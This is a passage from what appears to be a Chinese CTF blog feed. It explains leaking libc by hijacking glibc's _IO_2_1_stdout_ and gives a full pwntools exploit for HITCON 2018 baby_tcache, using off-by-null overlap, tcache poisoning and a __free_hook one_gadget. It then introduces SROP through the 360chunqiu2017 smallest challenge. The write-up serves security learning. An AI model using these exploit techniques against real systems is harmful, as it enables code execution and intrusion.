fp-&gt;_IO_write_base</code>即可绕过这里的判断，使之相等的操作并不是没有可能，但是在实际操作中实现的几率比较小。一般在做这种题的时候都会伴随着随机化保护的开启，进行攻击的时候，我们一般采用的都是覆盖末位字节的方式造成偏移，因为即使随机化偏移也会存在0x1000对齐。但是这时候就会遇到一个很尴尬的情况，<code>_IO_read_end</code>和<code>_IO_write_base</code>存放的地址是由末位字节和其他高字节共同组成的，其他高字节由于随机化的缘故无法确定，所以何谈使两个成员变量中的地址相等呢</p><p>第二，可以看到<code>else if</code>这条分支中调用了<code>_IO_SYSSEEK</code>系统调用，即<code>lssek</code>函数，如果我们将<code>_IO_read_end</code>的值设置为0，那么<code>_IO_SYSSEEK</code>的二参<code>fp-&gt;_IO_write_base - fp-&gt;_IO_read_end</code>得出的数值就有可能非常大，这就会导致<code>sleek</code>函数执行不成功导致退出，这是因为载入内存的数据范围可能并不大，但是经过<code>sleek</code>函数修改过大的偏移之后超过了数据范围的边界。一旦<code>sleek</code>函数执行不成功导致退出，那么就不会到达我们想要的<code>_IO_SYSWRITE</code>系统调用了</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span></span></span><br><span class="line"><span class="function">_IO_size_t</span></span><br><span class="line"><span class="function"><span class="title">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然要使得判断成立，那就<code>|_IO_IS_APPENDING</code>它就可以了：</p><blockquote><p><code>_flags |= _IO_IS_APPENDING # _flags = 0xfbad1800</code></p></blockquote><p>所以完整的调用链为：<code>puts -&gt; IO_puts -&gt; _IO_new_file_xsputn -&gt; _IO_new_file_overflow -&gt; _IO_do_write -&gt; new_do_write -&gt; _IO_SYSWRITE</code></p><p>能够成功调用<code>_IO_SYSWRITE</code>之后还有一个问题，就是输出的大小问题，回看之前的<code>IO_FILE</code>结构体中有个叫<code>_IO_write_base;</code>，其实只要修改它的大小稍微小一点，就能输出与<code>libc</code>挨得很近的值，至于上面几个关于<code>read</code>的成员，覆盖成0就好，其实不太明白这其中的道理，猜测是为了放置它搅屎吧，设置成0简单又粗暴….</p><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>在比赛中有两种情况来泄露，一个是在<code>libc-2.23</code>，另一个是在<code>libc-2.27</code>下，本质就是一个用<code>fastbin</code>来劫持<code>IO_2_1_stdout</code>，一个用<code>tache</code>来劫持<code>IO_2_1_stdout</code>，<code>fastbin</code>就得找一个<code>/x7f</code>大小的堆块才能链入<code>fastbin</code>，<code>tache</code>直接修改<code>fd</code>指针即可</p><h5 id="libc-2-27"><a href="#libc-2-27" class="headerlink" title="libc-2.27"></a>libc-2.27</h5><p><strong>HITCON 2018 PWN baby_tcache</strong></p><p>程序简单的离谱，第一次看见只有两个选项的菜单题：</p><p><code>add</code>函数里面的<code>chunk_ptr[size] = 0;</code>存在<code>off-by-null</code>，真的是不做多点题，对漏洞的敏感度真的不高，看半天没看出来….</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *chunk_ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;:(&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> v0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !chunk_list[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  size = read();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  chunk_ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !chunk_ptr )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  read_0(chunk_ptr, size);</span><br><span class="line">  chunk_ptr[size] = <span class="number">0</span>;</span><br><span class="line">  chunk_list[i] = chunk_ptr;</span><br><span class="line">  v0 = chunk_size;</span><br><span class="line">  chunk_size[i] = size;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>free</code>就没啥问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  v1 = read();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( chunk_list[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(chunk_list[v1], <span class="number">218</span>, chunk_size[v1]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_list[v1]);</span><br><span class="line">    chunk_list[v1] = <span class="number">0LL</span>;</span><br><span class="line">    chunk_size[v1] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;:)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那既然有<code>off-by-null</code>，那利用的方法也就很明确了！做堆叠，做法也是十分的简单，这里就不赘述了，忘了就去看看<code>off-by-one</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(0x500)  #0</span><br><span class="line">add(0x70)    #1</span><br><span class="line">add(0x5f0)  #2</span><br><span class="line">add(0x20)         #3</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">add(0x78,&#x27;A&#x27;*0x70+p64(0x590))</span><br><span class="line"></span><br><span class="line">free(2)                </span><br></pre></td></tr></table></figure><p>堆叠完成之后，在<code>tache</code>里面链入<code>main_arena</code>，就可以修改它的后俩个比特劫持到<code>IO_2_1_stdout</code>，虽然程序开了ASLR，但它的后12个<code>bit</code>是始终不会变的，也就是说还有4个<code>bit</code>会变，那怎么办呢？只能猜一个值然后来爆破，几率为<code>1/16</code>（一开始对爆破感觉好厉害的样子，其实就是写个<code>try except</code>….）</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">opt</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(opt))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x500</span>)  <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x70</span>)    <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x5f0</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x500</span>)  <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">&#x27;A&#x27;</span>)         <span class="comment">#3</span></span><br><span class="line">    </span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x78</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x70</span>+p64(<span class="number">0x590</span>))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)                </span><br><span class="line">    free(<span class="number">0</span>)                </span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x500</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;\x60\xb7&#x27;</span>)  </span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x78</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0x0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x90&#x27;</span>) <span class="comment">#change the _flag</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    data = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = data - <span class="number">4114403</span></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4f322</span> <span class="comment">#0x4f2c5 0x4f322 0x10a38c</span></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base :&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,p64(free_hook))</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    add(<span class="number">0x80</span>,p64(free_hook))</span><br><span class="line">    add(<span class="number">0x80</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    a = <span class="number">16</span></span><br><span class="line">    <span class="keyword">while</span>(a) :</span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            p = process(<span class="string">&#x27;./baby_tcache&#x27;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc-2.27.so&quot;</span>&#125;)<span class="comment">#,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;&#125;</span></span><br><span class="line">            elf = ELF(<span class="string">&#x27;./baby_tcache&#x27;</span>)</span><br><span class="line">            libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">            <span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">            exp()</span><br><span class="line">            a -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">            <span class="built_in">print</span> e</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            p.interactive()</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><p>参考文章：</p><p><a href="https://bbs.pediy.com/thread-249713.htm">Tcache利用总结</a></p><p><a href="https://blog.csdn.net/qq_41202237/article/details/113867648?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163370995516780274138633%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163370995516780274138633&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-113867648.pc_v2_rank_blog_default&utm_term=_IO_2_1_stdout%E6%B3%84%E9%9C%B2libc&spm=1018.2226.3001.4450">HITCON 2018 PWN baby_tcache超详细讲解</a></p><p><a href="https://n0va-scy.github.io/2019/09/21/IO_FILE/#more">IO_FILE泄露libc</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SROP</title>
      <link href="/2021/10/08/SROP/"/>
      <url>/2021/10/08/SROP/</url>
      
        <content type="html"><![CDATA[<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><blockquote><p>在不同版本的 Unix 系统中被使用了 40 多年的 Signal 机制，存在一个很容易被攻击者利用的设计缺陷，针对这种攻击的手法叫做SROP，和传统的 ROP 攻击相比显得更加简单，可靠，可移植，虽然离提出的时间已经过去了许久，但在CTF的赛场上仍然存在着SROP的攻击手法，不过在CTF的SROP更多的是作为一种辅助ROP来使用，让<code>exp</code>的编写更加的简便，比如ORW<code>+</code>SROP。</p></blockquote><p>此攻击手法首次提出是在安全顶会Oakland 2014，原文看的太难受了，看看<a href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf">会议PPT</a>就好了，SROP也算作比较高级一点的ROP了，接下来慢慢看它是怎么攻击的</p><h4 id="Signal-机制"><a href="#Signal-机制" class="headerlink" title="Signal 机制"></a>Signal 机制</h4><p>在开始介绍SROP之前，肯定要介绍Signal 机制，就拿出老生常谈的一张Signal 信号的调用流程图：</p><img src="/2021/10/08/SROP/1-1633624930554.png" class=""><p>①内核向进程发送Signal 信号，此进程挂起并进入用户态程序，进行<code>ucontext save</code>，即往栈上压入<code>ucontext</code>和<code>siginfo</code>，主要是将所有寄存器压入栈中，以及压入 Signal 信息</p><img src="/2021/10/08/SROP/2-1633624936917.png" class=""><p>最后压入指向 <code>sigreturn</code> 的系统调用地址，需要注意到的一点是，这一切的操作都是在栈上进行，也就是说这段区域在某种程度上是可控的，这就是问题的所在！！！</p><img src="/2021/10/08/SROP/3-1633624945177.png" class=""><p>②跳转到注册过的 <code>signal handler</code> 中处理相应的 Signal。因此，当 <code>signal handler</code> 执行完之后，就会执行 <code>sigreturn</code> 代码</p><p>③<code>signal handler</code> 返回后，内核为执行<code> sigreturn</code> 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 <code>pop</code> 回对应的寄存器，最后恢复进程的执行。其中，32 位的 <code>sigreturn</code> 的调用号为 77，64 位的系统调用号为 15</p><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>上面已经讲到保存的参数（包括寄存器等信息）都是处于用户态中，并且可以进行读写，再加上内核并不会检查它的参数是否给改变，所以我们就可以伪造这些寄存器的参数，当系统执行完 <code>sigreturn</code> 系统调用之后，会执行<code> pop</code> 指令来恢复相应寄存器的值，当执行到 <code>rip</code>时，就会将程序执行流指向 <code>syscall</code> 地址，既然能进入系统调用，那么是不是我们只要在对应的寄存器上伪造我们想要的值就能进入任何想要的系统调用，答案是肯定的！下面又是老生常谈的一张图，结果很明显，如果用下列寄存器的值来执行系统调用就能<code>getshell</code>：</p><img src="/2021/10/08/SROP/4.png" class=""><p>那要形成调用链呢？回想原始的ROP，是不是配合<code>ret</code>就可以形成ROP链，所以这里也是，不过对应的栈顶也要指向下一个伪造<code>syscall</code>的位置：</p><img src="/2021/10/08/SROP/5.png" class=""><p>除了手动去布置寄存器的值之外，<code>pwntool</code>还有一个集成的工具—-<code>SigreturnFrame() </code>模块，在CTF的题目中经常会使用到它，其实它就是把栈帧里面每个寄存器的值就标记好了，我们只需要生成一个<code>SigreturnFrame() </code>模块，然后再往这个模块里面放入寄存器的值就可以了，下面是在<code>i386</code> 上调用<code>mprotect</code>，具体可以参考链接：</p><p><a href="https://docs.pwntools.com/en/stable/rop/srop.html?highlight=SigreturnFrame">Sigreturn Oriented Programming</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.clear(arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = SigreturnFrame(kernel=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>unpack_many(<span class="built_in">bytes</span>(s))</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">123</span>, <span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">assert</span> <span class="built_in">len</span>(s) == <span class="number">80</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.eax = <span class="number">125</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.ebx = <span class="number">0x00601000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.ecx = <span class="number">0x1000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.edx = <span class="number">0x7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">bytes</span>(s)) == <span class="number">80</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>unpack_many(<span class="built_in">bytes</span>(s))</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6295552</span>, <span class="number">7</span>, <span class="number">4096</span>, <span class="number">125</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">123</span>, <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>下面就用一道题来看看<code>SigreturnFrame() </code>模块怎么用吧！</p><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><h5 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a>360chunqiu2017_smallest</h5><p>看下保护，就开了NX</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序短的离谱，就一个系统调用为<code>read(0,rsp,400h)</code>，但是这里没有SROP的系统调用号15呀？那该怎么调用它呢？答：<code>read</code>函数返回值会到<code>rax</code>中：</p><blockquote><p><code>ssize_t read ^[1]^ (int fd, void *buf, size_t count);</code><br>成功返回读取的字节数，出错返回-1并设置<code>errno</code>，如果在调<code>read</code>之前已到达文件末尾，则这次<code>read</code>返回0。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004000B0 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:00000000004000B0                 xor     rax, rax</span><br><span class="line">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="line">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="line">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:00000000004000C0                 retn</span><br><span class="line">.text:00000000004000C0 start           endp</span><br></pre></td></tr></table></figure><p>现在已经直到了触发SROP的方法，我们都知道用<code>execve</code>来<code>getshell</code>是需要传入<code>/bin/sh</code>地址的，但在此题目当中既没有这个字符串：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  one_gadget smallest </span><br><span class="line">[OneGadget] ArgumentError: File <span class="string">&quot;smallest&quot;</span> doesn<span class="string">&#x27;t contain string &quot;/bin/sh&quot;, not glibc?</span></span><br></pre></td></tr></table></figure><p>同时又是静态链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  file  smallest</span><br><span class="line">smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped</span><br></pre></td></tr></table></figure><p>所以需要写入到某个地方，并且这个地方的地址是可知的，看下<code>vmmap</code>只有<code>stack</code>能读写，<del>同时这里面并没有<code>mprotect</code>来修改页属性</del>（可以用系统调用）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /smallest</span><br><span class="line">    0x7ffff7ffb000     0x7ffff7ffe000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 r-xp     1000 0      [vdso]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure><p>既然只能写栈，那就得先泄露栈地址，怎么泄露呢？刚刚说到我们可以修改它的系统调用，对吧！所以我们读入一个字符来修改<code>rax</code>为1，同时还要防止它执行<code>.text:00000000004000B0  xor  rax, rax</code>，不然一切还是白费了！，那怎么办呢？回到第一个的<code>read</code>，我们反汇编看一下，欸嘿！它是往返回地址上写的欸（IDA 7.5已经帮我们分析出来了）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line">  